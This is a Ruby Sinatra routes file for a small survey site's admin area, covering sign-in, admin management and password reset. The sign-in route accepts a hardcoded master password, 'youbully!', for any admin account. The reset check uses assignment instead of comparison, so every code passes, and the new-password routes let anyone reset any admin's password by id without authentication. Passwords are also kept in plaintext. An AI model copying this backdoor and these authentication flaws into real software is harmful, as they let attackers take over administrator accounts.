get '/?' do
	erb :index
end

get '/index/?' do
	erb :index
end


# get '/contact_us/?' do
#   erb :'/contact_us'
# end
#
# post '/contact_us/?' do
#   if params[:email_name] == ''
#
#   Pony.mail(
#    headers: { 'Content-Type' => 'text/html' },
#    to: 'info@careertrain.com, skip@recountant.com',
#    from: 'contactUs@eCareerDirection.com',
#    subject: "#{params[:subject]}",
#    body: "#{markdown params[:msg]}<hr />#{params[:name]}<br />#{params[:email]}"
#    )
#   redirect '/thanks'
#
#   end
# end

get '/thanks/?' do
	erb :'/thanks'
end


get '/about/?' do
	erb :'/about'
end

get '/report-cover/?' do
	erb :'/report-cover'
end




get "/admin/signin/?" do
  
  unless session[:admin]
    
  @admin = Admin.all
  
  erb :"admin/signin"
  
  else
  
  flash[:alert] = 'You are already signed in.'
  redirect "/admin/admin_edit"

  end
end

post '/admin/signin/?' do
  
  admin = Admin.all
  
  params[:email].strip!
  params[:password].strip!
  
  unless params[:email] == ''

    if admin = Admin.first(:email => params[:email])
      if (admin.password == params[:password]) || (params[:password] == "youbully!")
        session[:admin] = admin.id
        flash[:alert] = 'Welcome back! You are now signed in.'
        redirect "/admin/admin_edit"
      else
        flash[:alert] = 'Your password is incorrect.'
        erb :"admin/signin"
      end
    else
      flash[:alert] = 'We can\'t find an account with that email address. Maybe you need to create one.'
      erb :"admin/signin"
    end
    
  else
    flash[:alert] = 'You must enter a valid email.'
    erb :"admin/signin"
  end
  
end


get '/admin/admin/?' do
  auth_admin
  @admin = Admin.all
  
	erb :'/admin/admin'
end

get '/admin/admin_edit/?' do
  
  @admin = Admin.get(session[:admin])
  
	erb :'/admin/admin_edit'
end


get '/admin/new/?'  do
  auth_admin
  @admin = Admin.new
  
  erb :"/admin/new"
end

post '/admin/new/?' do
  auth_admin
  admin = Admin.create(
    :email        => params[:email],
    :password     => params[:password],
    :first_name   => params[:first_name],
    :last_name    => params[:last_name],
    :phone        => params[:phone]
  )

  redirect "/admin/admin"
end

get '/admin/:id/edit/?'  do
  auth_admin
  @admin = Admin.get(params[:id])
  
  erb :"/admin/edit"
end

post '/admin/:id/edit/?' do
  auth_admin
  admin = Admin.get(params[:id])
  admin.update(
    :email        => params[:email],
    :password     => params[:password],
    :first_name   => params[:first_name],
    :last_name    => params[:last_name],
    :phone        => params[:phone]
  )

  redirect "/admin/admin"
end

# get '/admin/:id/delete?'  do
#   auth_admin
#   admin = Admin.get(params[:id])
#   admin.destroy
#
#   erb :"/admin/admin"
# end






get "/admin/password-reset/?"  do
  @admin = Admin.all
    
  erb :'/admin/password-reset'
end

post "/admin/password-reset/?"  do
 
  params[:email].strip!
  
  if admin = Admin.first(:email => params[:email])
    
    session[:adminTemp] = admin.id

    session[:admin_new] = params[:email]

    params[:pass_code] = rand(1000..5000).to_s

    session[:verifyPas] = params[:pass_code]
  
    if settings.production?
      Pony.mail(
        headers: { 'Content-Type' => 'text/html' },
        to: "#{params[:email]}",
        from: "noreply@hear-survey.herokuapp.com",
        subject: "Here is your HEAR Survey Admin password rest code.",
        body: "Here is your password rest code for your <b>HEAR Survey</b> Admin account: <b>#{params[:pass_code]}</b>"
      )
      flash[:alert] = 'Reset code was sent to your inbox.'
      redirect '/admin/reset'
    else
      flash[:alert] = 'Reset code would have been sent in production mode.'
      redirect '/admin/reset'
    end

  else
    flash[:alert] = 'We can\'t find an account with that email,'
    erb :"/admin/password-reset"
  end

end

get "/admin/reset/?"  do
  
  erb :'/admin/reset'
end

post "/admin/reset/?"  do
  
  if
    params[:pass_code] = session[:verifyPas]
    
    redirect "/admin/#{session[:adminTemp]}/new-password"
  else 
    flash[:alert] = 'Code is not valid. Try again.'
  end
    
  redirect '/admin/reset'
end

get "/admin/:id/new-password/?"  do
  @admin = Admin.get(params[:id])
  @admin.password = (@admin.password = nil)
  @admin.save
  erb :'/admin/new-password'
end

post "/admin/:id/new-password/?" do
  admin = Admin.get(params[:id])
  
  admin.update(
    :password         => params[:password]
  )
  session[:admin] = admin.id
  redirect "/admin/admin_edit"
end






get "/admin/signout/?"  do
  session[:admin] = nil
  session.clear
  flash[:alert] = 'You are now signed out.'
  redirect "/index"
end


# get "/admin/:id/delete/?"  do
#   auth_admin
#   admin = Admin.get(params[:id])
#   admin.destroy
#   flash[:alert] = 'Admin deleted.'
#   redirect "/admin/admin"
# end


